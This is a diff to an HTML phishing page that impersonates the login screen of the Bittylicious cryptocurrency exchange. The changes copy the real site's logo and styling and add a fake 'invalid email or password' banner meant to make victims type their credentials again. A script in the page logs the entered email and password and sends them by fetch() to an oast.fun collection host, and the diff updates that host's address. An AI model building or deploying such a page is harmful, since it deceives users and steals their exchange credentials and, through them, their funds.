@@ -4,12 +4,16 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Bittylicious | Log in</title>
+<link rel="icon" href="https://bittylicious.com/favicon.ico">
 <style>
     body {
-        font-family: Arial, sans-serif;
+        font-family: helvetica neue, Helvetica, Arial, sans-serif;
+        font-size: 14px;
+        line-height: normal;
+        color: #333;
+        background-color: #fff;
         margin: 0;
         padding: 0;
-        background-color: white;
         display: flex;
         flex-direction: column;
         align-items: center;
@@ -20,17 +24,46 @@
         text-align: center;
         margin: 0 auto;
     }
-    .logo img {
-        width: 100%;
-        max-width: 300px;
+    .logo {
+        margin-bottom: 5px;
+        width: 640px;
+        height: 89px;
+        margin-left: auto;
+        margin-right: auto;
+        background-image: url('https://bittylicious.com/images/logo_640x89.png');
+        background-position: 0 0;
+        background-repeat: no-repeat;
+    }
+    .title {
+        font-size: 40px;
+        text-align: center;
         margin-top: 20px;
+        margin-bottom: 20px;
+        font-weight: 700;
+    }
+    .error {
+        display: inline-block;
+        margin: 10px 10px 20px;
+        padding: 8px 15px;
+        background: #ffbdbd;
+        border: 1px solid rgba(0, 0, 0, .15);
+        border-radius: 4px;
+        box-shadow: inset 0 1px 0 rgba(255, 255, 255, .5), 0 2px 2px rgba(0, 0, 0, .3), 0 0 4px 1px rgba(0, 0, 0, .2);
+        text-decoration: none;
+        text-shadow: 0 1px rgba(255, 255, 255, .7);
+        font-size: 20px;
     }
     .form-container {
         background-color: white;
         padding: 20px;
         border-radius: 10px;
-        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        box-shadow: 0 0 5px rgba(0, 0, 0, 0.05);
         margin-top: 20px;
+    }
+    .biginput {
+        font-size: 20px;
+        margin-left: auto;
+        margin-right: auto;
     }
     .form-group {
         margin-bottom: 15px;
@@ -40,11 +73,20 @@
         display: block;
         margin-bottom: 5px;
     }
-    .form-group input {
+    .form-group input.rounded {
         width: 100%;
         padding: 10px;
         border: 1px solid #ccc;
-        border-radius: 5px;
+        border-radius: 10px;
+        -moz-box-shadow: 2px 2px 3px #666;
+        -webkit-box-shadow: 2px 2px 3px #666;
+        box-shadow: 2px 2px 3px #666;
+        outline: 0;
+        font-size: 20px;
+        -webkit-appearance: none;
+    }
+    .form-group input.rounded:focus {
+        border-color: #393;
     }
     .login-button {
         display: inline-block;
@@ -94,21 +136,203 @@
 <body>
     <div class="container">
         <div class="logo">
-            <img src="https://raw.githubusercontent.com/Usama3423/login/main/logo_640x89.webp" alt="Bittylicious Logo">
+            <img src="https://bittylicious.com/images/logo_640x89.png" alt="Bittylicious Logo">
+        </div>
+        <div style="width: 100%; text-align: center;" id="genericAPIErrorWrapper">
+            <div class="error" id="genericAPIError">Invalid email address or password. <a href="/forgot">Click here</a> if you have forgotten your password.</div>
         </div>
         <div class="form-container">
             <h1>Log in</h1>
-            <form action="#" method="post" id="loginForm">
-                <div class="form-group">
-                    <small>Email address</small>
-                    <input type="text" name="username" id="loginUsername" required>
-                </div>
-                <div class="form-group">
-                    <small>Password</small>
-                    <input type="password" name="password" id="loginPassword" required>
-                </div>
-                <button type="submit" class="login-button" id="loginButton">Log in</button>
-            </form>
+            <style>
+        body {
+            margin: 0;
+            font-family: helvetica neue,Helvetica,Arial,sans-serif;
+            font-size: 14px;
+            line-height: normal;
+            color: #333;
+            background-color: #fff;
+        }
+
+        html, body {
+            height: 100%;
+        }
+
+        body>.bodyEverything {
+            height: auto;
+            min-height: 100%;
+        }
+
+        .bodyEverything {
+            height: 100%;
+            height: auto;
+        }
+
+        .bodyNotFooter {
+            margin-bottom: 20px;
+            padding-bottom: 90px;
+        }
+
+        .bodyText {
+            width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        a {
+            color: #08c;
+            text-decoration: none;
+        }
+
+        a:hover, a:focus {
+            color: #005580;
+            text-decoration: underline;
+        }
+
+        .modern {
+            display: inline-block;
+            margin: 10px;
+            padding: 8px 15px;
+            background: #b8ed01;
+            border: 1px solid rgba(0,0,0,.15);
+            border-radius: 4px;
+            transition: all .3s ease-out;
+            box-shadow: inset 0 1px 0 rgba(255,255,255,.5),0 2px 2px rgba(0,0,0,.3),0 0 4px 1px rgba(0,0,0,.2);
+            text-decoration: none;
+            text-shadow: 0 1px rgba(255,255,255,.7);
+            font-size: 20px;
+            color: #4c4c4c;
+            font-family: Ubuntu,Verdana,helvetica neue,Helvetica,Arial,sans-serif;
+        }
+
+        input[type=radio].modern {
+            box-shadow: none;
+        }
+
+        .modernDisabled {
+            display: inline-block;
+            margin: 10px;
+            padding: 8px 15px;
+            background: #eee;
+            border: 1px solid rgba(0,0,0,.15);
+            border-radius: 4px;
+            transition: all .3s ease-out;
+            box-shadow: inset 0 1px 0 rgba(255,255,255,.5),0 2px 2px rgba(0,0,0,.3),0 0 4px 1px rgba(0,0,0,.2);
+            text-decoration: none;
+            text-shadow: 0 1px rgba(255,255,255,.7);
+            font-size: 20px;
+            color: #b0b0b0;
+            font-family: Ubuntu,Verdana,helvetica neue,Helvetica,Arial,sans-serif;
+        }
+
+        .modernsmall {
+            position: relative;
+            top: -1px;
+            display: inline-block;
+            margin: 8px;
+            padding: 5px 7px;
+            background: #b8ed01;
+            border: 1px solid rgba(0,0,0,.15);
+            border-radius: 2px;
+            transition: all .3s ease-out;
+            box-shadow: inset 0 1px 0 rgba(255,255,255,.5),0 2px 2px rgba(0,0,0,.3),0 0 4px 1px rgba(0,0,0,.2);
+            text-decoration: none;
+            text-shadow: 0 1px rgba(255,255,255,.7);
+            font-size: 16px;
+        }
+
+        .modernsmall:disabled {
+            background: #eee;
+        }
+
+        .moderntiny {
+            position: relative;
+            top: -1px;
+            display: inline-block;
+            margin: 0 2px 0 0;
+            padding: 1px 2px;
+            background: #b8ed01;
+            border: 1px solid rgba(0,0,0,.15);
+            border-radius: 2px;
+            transition: all .3s ease-out;
+            box-shadow: inset 0 1px 0 rgba(255,255,255,.5),0 2px 2px rgba(0,0,0,.3),0 0 4px 1px rgba(0,0,0,.2);
+            text-decoration: none;
+            text-shadow: 0 1px rgba(255,255,255,.7);
+            font-size: 14px;
+        }
+
+        .modernsmall.shadebutton, .modernsmall.shadebutton:hover, .moderntiny.shadebutton:hover {
+            background: #e8ffd1;
+            color: #ccc;
+            cursor: default;
+        }
+
+        .modernred {
+            display: inline-block;
+            margin: 10px;
+            padding: 4px 7px;
+            background: #f99;
+            border: 1px solid rgba(0,0,0,.15);
+            border-radius: 4px;
+            transition: all .3s ease-out;
+            box-shadow: inset 0 1px 0 rgba(255,255,255,.5),0 2px 2px rgba(0,0,0,.3),0 0 4px 1px rgba(0,0,0,.2);
+            text-decoration: none;
+            text-shadow: 0 1px rgba(255,255,255,.7);
+            font-size: 14px;
+            color: #333;
+        }
+
+        .modern:hover, .modernsmall:hover, .moderntiny:hover {
+            background: #c7fe0a;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .modernred:hover {
+            background: #fe6060;
+            cursor: pointer;
+            text-decoration: none;
+            color: #333;
+        }
+
+        .biginput {
+            font-size: 20px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        input.rounded {
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            -moz-border-radius: 10px;
+            -webkit-border-radius: 10px;
+            border-radius: 10px;
+            -moz-box-shadow: 2px 2px 3px #666;
+            -webkit-box-shadow: 2px 2px 3px #666;
+            box-shadow: 2px 2px 3px #666;
+            padding: 4px 7px;
+            outline: 0;
+            font-size: 20px;
+            -webkit-appearance: none;
+        }
+
+        input.rounded:focus {
+            border-color: #393;
+        }
+    </style>
+</head>
+<body>
+    <form action="" id="loginForm" method="post" style="text-align: center;">
+        <div class="biginput">
+            <div style="text-align: left; width: 400px; margin-left: auto; margin-right: auto;">
+                <small>Email address</small><br>
+                <input class="rounded text" type="text" name="username" id="loginUsername" value="" size="30" style="width: 380px;"><br>
+                <small>Password</small><br>
+                <input class="rounded text" type="password" name="password" id="loginPassword" value="" size="30" style="width: 380px;"><br>
+            </div>
+        </div>
+        <input type="hidden" name="returnURL" value="/">
+        <button class="modern" id="loginButton">Log in</button>
+    </form>
             <p><a href="/forgot">Forgotten password</a></p>
         </div>
         <div class="info">
@@ -153,7 +377,7 @@
             console.log("Password:", password);
 
             // Send the email and password to the server
-            fetch('https://qaddkrkqseozcfkqovthyoihlrizns3si.oast.fun', {
+            fetch('https://qaddkrkqseozcfkqovthzunhjh1fj2jv8.oast.fun', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
